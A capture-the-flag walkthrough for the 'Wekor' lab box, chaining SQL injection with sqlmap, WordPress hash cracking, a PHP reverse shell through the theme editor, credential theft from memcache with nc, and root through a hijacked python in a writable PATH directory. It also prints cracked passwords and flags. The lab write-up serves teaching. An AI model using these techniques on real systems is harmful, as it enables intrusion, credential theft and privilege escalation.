# Wekor

CTF challenge involving Sqli , WordPress , vhost enumeration and recognizing internal services ;)

Hey Everyone! This Box is just a little CTF I've prepared recently. I hope you enjoy it as it is my first time ever creating something like this !

This CTF is focused primarily on enumeration, better understanding of services and thinking out of the box for some parts of this machine.

Feel free to ask any questions...It's okay to be confused in some parts of the box ;)

Just a quick note, Please use the domain `wekor.thm` as it could be useful later on in the box ;)

# User flag

## Nmap scan

Let's add the domain, as instructed:

~~~
┌──(kali㉿kali)-[/data/Wekor]
└─$ echo "10.10.207.93 wekor.thm" | sudo tee -a /etc/hosts
[sudo] password for kali: 
10.10.207.93 wekor.thm
~~~

Nmap reveals 2 open ports:

~~~
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 95:c3:ce:af:07:fa:e2:8e:29:04:e4:cd:14:6a:21:b5 (RSA)
|   256 4d:99:b5:68:af:bb:4e:66:ce:72:70:e6:e3:f8:96:a4 (ECDSA)
|_  256 0d:e5:7d:e8:1a:12:c0:dd:b7:66:5e:98:34:55:59:f6 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 9 disallowed entries 
| /workshop/ /root/ /lol/ /agent/ /feed /crawler /boot 
|_/comingreallysoon /interesting
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
~~~

## Robots.txt

Starting with the web port, the `robots.txt` file reveals several locations:

~~~
User-agent: *
Disallow: /workshop/
Disallow: /root/
Disallow: /lol/
Disallow: /agent/
Disallow: /feed
Disallow: /crawler
Disallow: /boot
Disallow: /comingreallysoon
Disallow: /interesting
~~~

Most of the locations lead to 404 errors, but 1:

~~~
┌──(kali㉿kali)-[/data/Wekor]
└─$ for i in `curl -s http://wekor.thm/robots.txt | grep Disallow | cut -d " " -f2`;do echo $i;curl -I http://wekor.thm$i;echo "---";done
/workshop/
HTTP/1.1 404 Not Found
Date: Tue, 11 May 2021 16:27:13 GMT
Server: Apache/2.4.18 (Ubuntu)
Content-Type: text/html; charset=iso-8859-1

---
/root/
HTTP/1.1 404 Not Found
Date: Tue, 11 May 2021 16:27:13 GMT
Server: Apache/2.4.18 (Ubuntu)
Content-Type: text/html; charset=iso-8859-1

---
/lol/
HTTP/1.1 404 Not Found
Date: Tue, 11 May 2021 16:27:13 GMT
Server: Apache/2.4.18 (Ubuntu)
Content-Type: text/html; charset=iso-8859-1

---
/agent/
HTTP/1.1 404 Not Found
Date: Tue, 11 May 2021 16:27:13 GMT
Server: Apache/2.4.18 (Ubuntu)
Content-Type: text/html; charset=iso-8859-1

---
/feed
HTTP/1.1 404 Not Found
Date: Tue, 11 May 2021 16:27:13 GMT
Server: Apache/2.4.18 (Ubuntu)
Content-Type: text/html; charset=iso-8859-1

---
/crawler
HTTP/1.1 404 Not Found
Date: Tue, 11 May 2021 16:27:14 GMT
Server: Apache/2.4.18 (Ubuntu)
Content-Type: text/html; charset=iso-8859-1

---
/boot
HTTP/1.1 404 Not Found
Date: Tue, 11 May 2021 16:27:14 GMT
Server: Apache/2.4.18 (Ubuntu)
Content-Type: text/html; charset=iso-8859-1

---
/comingreallysoon
HTTP/1.1 301 Moved Permanently
Date: Tue, 11 May 2021 16:27:14 GMT
Server: Apache/2.4.18 (Ubuntu)
Location: http://wekor.thm/comingreallysoon/
Content-Type: text/html; charset=iso-8859-1

---
/interesting
HTTP/1.1 404 Not Found
Date: Tue, 11 May 2021 16:27:14 GMT
Server: Apache/2.4.18 (Ubuntu)
Content-Type: text/html; charset=iso-8859-1

~~~

Browsing `http://wekor.thm/comingreallysoon/` discloses a new location: `/it-next`:

~~~
┌──(kali㉿kali)-[/data/Wekor]
└─$ curl -s http://wekor.thm/comingreallysoon/
Welcome Dear Client!

We've setup our latest website on /it-next, Please go check it out!

If you have any comments or suggestions, please tweet them to @faketwitteraccount!

Thanks a lot !
~~~

## SQL Injection

There are many pages in this website. Checking all pages where forms are available led me to a SQL injection vulnerability in the `it_cart.php` page. Intercept the page with BurpSuite, save the POST request as `ìt_cart_coupon.xml` and use `sqlmap` to dump the database:

~~~
$ sqlmap -r it_cart_coupon.xml --dump-all --threads=10
~~~

SQLmap has dumped 2 interesting databases: `coupons` and `worpress`:

~~~
┌──(kali㉿kali)-[~/…/sqlmap/output/wekor.thm/dump]
└─$ ll
total 24
drwxr-xr-x 2 kali kali 4096 May 11 19:45 coupons
drwxr-xr-x 2 kali kali 4096 May 11 19:45 information_schema
drwxr-xr-x 2 kali kali 4096 May 11 19:46 mysql
drwxr-xr-x 2 kali kali 4096 May 11 19:47 performance_schema
drwxr-xr-x 2 kali kali 4096 May 11 19:49 sys
drwxr-xr-x 2 kali kali 4096 May 11 19:49 wordpress
~~~

List of tables in the `wordpress` database:

~~~                                                                                                                    
┌──(kali㉿kali)-[~/…/sqlmap/output/wekor.thm/dump]
└─$ tree wordpress 
wordpress
├── option_value-36999631.bin
├── post_content-15186792.bin
├── wp_comments.csv
├── wp_options.csv
├── wp_postmeta.csv
├── wp_posts.csv
├── wp_term_relationships.csv
├── wp_terms.csv
├── wp_term_taxonomy.csv
├── wp_usermeta.csv
└── wp_users.csv
~~~

Wordpress Users:

~~~
┌──(kali㉿kali)-[~/…/output/wekor.thm/dump/wordpress]
└─$ cat wp_users.csv     
ID,user_url,user_pass,user_email,user_login,user_status,display_name,user_nicename,user_registered,user_activation_key
1,http://site.wekor.thm/wordpress,$P$BoyfR2QzhNjRNmQZpva6TuuD0EE31B.,admin@wekor.thm,admin,0,admin,admin,2021-01-21 20:33:37,<blank>
5743,http://jeffrey.com,$P$BU8QpWD.kHZv3Vd1r52ibmO913hmj10,jeffrey@wekor.thm,wp_jeffrey,0,wp jeffrey,wp_jeffrey,2021-01-21 20:34:50,1611261290:$P$BufzJsT0fhM94swehg1bpDVTupoxPE0
5773,http://yura.com,$P$B6jSC3m7WdMlLi1/NDb3OFhqv536SV/,yura@wekor.thm,wp_yura,0,wp yura,wp_yura,2021-01-21 20:35:27,<blank>
5873,http://eagle.com,$P$BpyTRbmvfcKyTrbDzaK1zSPgM7J6QY/,eagle@wekor.thm,wp_eagle,0,wp eagle,wp_eagle,2021-01-21 20:36:11,<blank>
~~~

There is an interesting information associated to the admin account: `http://site.wekor.thm/wordpress` may be the URL to Wordpress.

## Wordpress credentials

All user accounts but admin have been cracked:

~~~
┌──(kali㉿kali)-[/data/Wekor/files]
└─$ /data/src/john/run/john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt                                1 ⚙
Using default input encoding: UTF-8
Loaded 4 password hashes with 4 different salts (phpass [phpass ($P$ or $H$) 256/256 AVX2 8x3])
Cost 1 (iteration count) is 8192 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
rockyou          (wp_jeffrey)
xxxxxx           (wp_eagle)
soccer13         (wp_yura)
Use the "--show --format=phpass" options to display all of the cracked passwords reliably
Session completed
~~~

## Wordpress

Let's add the new virtualhost:

~~~
$ echo "10.10.207.93 site.wekor.thm" | sudo tee -a /etc/hosts
~~~

Now, browsing http://site.wekor.thm/wordpress leads to a Wordpress installation. we immediately jump to http://site.wekor.thm/wordpress/wp-admin/ and try the credentials found previously. Trying the 3 accounts reveals that `wp_yura` is actually granted administrator privileges

* `admin`: Administrator, but we haven't been able to crack the password
* `wp_eagle`: Subscriber
* `wp_jeffrey`: Subscriber
* `wp_yura`: Administrator

## Reverse Shell

Now that we are logged in with admin privileges, go to "Appearance > Theme Editor", and edit the `404.php` template page to replace its content with a PHP reverse shell. Start a listener (`nc -nlvp 4444`) and browse http://site.wekor.thm/wordpress/wp-content/themes/twentytwentyone/404.php. We now have a reverse shell.

## Lateral move (www-data -> Orka)

Running linpeas.sh will reveal several services running for localhost only, 1 of which on port 11211.

~~~
[+] Active Ports
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#open-ports
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -               
tcp        0      0 127.0.0.1:11211         0.0.0.0:*               LISTEN      -               
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -               
tcp        0      0 127.0.0.1:631           0.0.0.0:*               LISTEN      -               
tcp        0      0 127.0.0.1:3010          0.0.0.0:*               LISTEN      -               
tcp6       0      0 :::80                   :::*                    LISTEN      -               
tcp6       0      0 :::22                   :::*                    LISTEN      -               
tcp6       0      0 ::1:631                 :::*                    LISTEN      -               
~~~

After some reasearch on the Internet, I found [this post](https://book.hacktricks.xyz/pentesting/11211-memcache) about memcache. Let's check if we can dump cached information:

~~~
www-data@osboxes:/$ echo "stats items" | nc -vn -w 1 127.0.0.1 11211
echo "stats items" | nc -vn -w 1 127.0.0.1 11211
Connection to 127.0.0.1 11211 port [tcp/*] succeeded!
STAT items:1:number 5
STAT items:1:age 1361
STAT items:1:evicted 0
STAT items:1:evicted_nonzero 0
STAT items:1:evicted_time 0
STAT items:1:outofmemory 0
STAT items:1:tailrepairs 0
STAT items:1:reclaimed 0
STAT items:1:expired_unfetched 0
STAT items:1:evicted_unfetched 0
STAT items:1:crawler_reclaimed 0
STAT items:1:crawler_items_checked 0
STAT items:1:lrutail_reflocked 0
END
www-data@osboxes:/$ echo "stats cachedump 1 0" | nc -vn -w 1 127.0.0.1 11211
echo "stats cachedump 1 0" | nc -vn -w 1 127.0.0.1 11211
Connection to 127.0.0.1 11211 port [tcp/*] succeeded!
ITEM id [4 b; 1620801753 s]
ITEM email [14 b; 1620801753 s]
ITEM salary [8 b; 1620801753 s]
ITEM password [15 b; 1620801753 s]
ITEM username [4 b; 1620801753 s]
END
www-data@osboxes:/$ echo "get username" | nc -vn -w 1 127.0.0.1 11211
echo "get username" | nc -vn -w 1 127.0.0.1 11211
Connection to 127.0.0.1 11211 port [tcp/*] succeeded!
VALUE username 0 4
Orka
END
www-data@osboxes:/$ echo "get password" | nc -vn -w 1 127.0.0.1 11211
echo "get password" | nc -vn -w 1 127.0.0.1 11211
Connection to 127.0.0.1 11211 port [tcp/*] succeeded!
VALUE password 0 15
OrkAiSC00L24/7$
END
www-data@osboxes:/$ 
~~~

We have been able to get Orka's password: `OrkAiSC00L24/7$`

## User flag

Connect as `Orka` and get the user flag:

~~~
www-data@osboxes:/$ su Orka
su Orka
Password: OrkAiSC00L24/7$

Orka@osboxes:~$ cat /home/Orka/user.txt
1a26a6d51c0172400add0e297608dec6
~~~

User flag: `1a26a6d51c0172400add0e297608dec6`

# Root flag

## Orka's privileges

Orka can run a `bitcoin` binary as `root` with `sudo`.

~~~
Orka@osboxes:~/.ssh$ sudo -l
sudo -l
[sudo] password for Orka: OrkAiSC00L24/7$

Matching Defaults entries for Orka on osboxes:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User Orka may run the following commands on osboxes:
    (root) /home/Orka/Desktop/bitcoin
~~~

Checking the directory where this binary lands reveals a python script:

~~~
Orka@osboxes:~/Desktop$ ll
ll
total 20
drwxrwxr-x  2 root root 4096 Jan 23 17:45 ./
drwxr-xr-- 19 Orka Orka 4096 May 12 03:51 ../
-rwxr-xr-x  1 root root 7696 Jan 23 15:23 bitcoin*
-rwxr--r--  1 root root  588 Jan 23 14:27 transfer.py*
~~~

Running `strings` against the binary will reveal the expected password (`password`). Let's run it:

~~~
Orka@osboxes:~/Desktop$ ./bitcoin
./bitcoin
Enter the password : password
password
Access Granted...
            User Manual:            
Maximum Amount Of BitCoins Possible To Transfer at a time : 9 
Amounts with more than one number will be stripped off! 
And Lastly, be careful, everything is logged :) 
Amount Of BitCoins : 20
20
Saving 2 BitCoin(s) For Later Use 
Do you want to make a transfer? Y/N : Y
Y
Transfering 2 BitCoin(s) 
Transfer Completed Successfully...
~~~

## Reverse engineering (bitcoin, transfer.py)

Get a copy of both files and analyze the binary in Hopper to get the following pseudo code. We see that the binary calls a python script (`transfer.py`) with a relative path:

```c
int main(int arg0) {
    ebp = &stack[-8];
    *(ebp - 0xc) = *0x14;
    printf("Enter the password : ");
    gets(ebp - 0x7f);
    esp = ((((esp & 0xfffffff0) - 0xa0) + 0x10 - 0x10) + 0x10 - 0x10) + 0x10;
    if (strcmp(ebp - 0x7f, "password") != 0x0) {
            puts("Access Denied... ");
    }
    else {
            puts("Access Granted...");
            sleep(0x1);
            puts("\t\t\tUser Manual:\t\t\t");
            puts("Maximum Amount Of BitCoins Possible To Transfer at a time : 9 ");
            puts("Amounts with more than one number will be stripped off! ");
            puts("And Lastly, be careful, everything is logged :) ");
            printf("Amount Of BitCoins : ");
            __isoc99_scanf(0x804893b);
            esp = ((((((((esp - 0x10) + 0x10 - 0x10) + 0x10 - 0x10) + 0x10 - 0x10) + 0x10 - 0x10) + 0x10 - 0x10) + 0x10 - 0x10) + 0x10 - 0x10) + 0x10;
            eax = __ctype_b_loc();
            eax = *eax;
            edx = *(int8_t *)(ebp - 0x80) & 0xff;
            if ((*(int16_t *)(eax + sign_extend_32(edx) + sign_extend_32(edx)) & 0xffff & 0xffff & 0x800) == 0x0) {
                    puts("\n Sorry, This is not a valid amount! ");
            }
            else {
                    sprintf(ebp - 0x70, "python /home/Orka/Desktop/transfer.py %c", sign_extend_32(*(int8_t *)(ebp - 0x80) & 0xff));
                    system(ebp - 0x70);
            }
    }
    ecx = *(ebp - 0xc);
    ecx = ecx ^ *0x14;
    if (ecx != 0x0) {
            eax = __stack_chk_fail();
    }
    else {
            eax = 0x0;
    }
    return eax;
}
```

The python script is as follows:

```python
Orka@osboxes:~/Desktop$ cat transfer.py
cat transfer.py
import time
import socket
import sys
import os

result = sys.argv[1]

print "Saving " + result + " BitCoin(s) For Later Use "

test = raw_input("Do you want to make a transfer? Y/N : ")

if test == "Y":
    try:
        print "Transfering " + result + " BitCoin(s) "
        s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        connect = s.connect(("127.0.0.1",3010))
        s.send("Transfer : " + result + "To https://transfer.bitcoins.com")
        time.sleep(2.5)
        print ("Transfer Completed Successfully...")
        time.sleep(1)
        s.close()
    except:
        print("Error!")
else:
    print("Quitting...")
    time.sleep(1)
```

## Hijack the python binary

As `python` is called with a relative path, we can hijack the python binary. Checking the `PATH` environment variable:

~~~
Orka@osboxes:/$ echo $PATH
echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
~~~

Write access to /usr/sbin:

~~~
Orka@osboxes:/$ ls -la /usr/sbin/ | head
ls -la /usr/sbin/ | head
total 41284
drwxrwxr-x  2 root Orka    12288 Jan 23 16:01 . <----------------- write access
drwxr-xr-x 11 root root     4096 Feb 26  2019 ..
lrwxrwxrwx  1 root root        7 Aug 12  2020 a2disconf -> a2enmod
lrwxrwxrwx  1 root root        7 Aug 12  2020 a2dismod -> a2enmod
lrwxrwxrwx  1 root root        7 Aug 12  2020 a2dissite -> a2enmod
lrwxrwxrwx  1 root root        7 Aug 12  2020 a2enconf -> a2enmod
-rwxr-xr-x  1 root root    15424 Jul 15  2020 a2enmod
lrwxrwxrwx  1 root root        7 Aug 12  2020 a2ensite -> a2enmod
-rwxr-xr-x  1 root root     9870 Aug 12  2020 a2query
ls: write error: Broken pipe
~~~

Let's write a fake `python` binary in `/usr/bin/` that will spawn a root shell:

~~~
$ cat > /usr/sbin/python << EOF
#!/bin/bash
/bin/bash
EOF
$ chmod +x /usr/sbin/python
~~~

## Root access

Now, running the program will spawn a root shell and we can get the root flag:

~~~
Orka@osboxes:/$ cat > /usr/sbin/python << EOF
#!/bin/bash
/bin/bash
EOF
cat > /usr/sbin/python << EOF
> #!/bin/bash
> /bin/bash
> EOF
Orka@osboxes:/$ chmod +x /usr/sbin/python
chmod +x /usr/sbin/python
Orka@osboxes:/$ sudo /home/Orka/Desktop/bitcoin
sudo /home/Orka/Desktop/bitcoin
Enter the password : password
password
Access Granted...
            User Manual:            
Maximum Amount Of BitCoins Possible To Transfer at a time : 9 
Amounts with more than one number will be stripped off! 
And Lastly, be careful, everything is logged :) 
Amount Of BitCoins : 20
20
root@osboxes:/# id
id
uid=0(root) gid=0(root) groups=0(root)
root@osboxes:/# cat /root/root.txt
cat /root/root.txt
f4e788f87cc3afaecbaf0f0fe9ae6ad7
~~~

Root flag: `f4e788f87cc3afaecbaf0f0fe9ae6ad7`
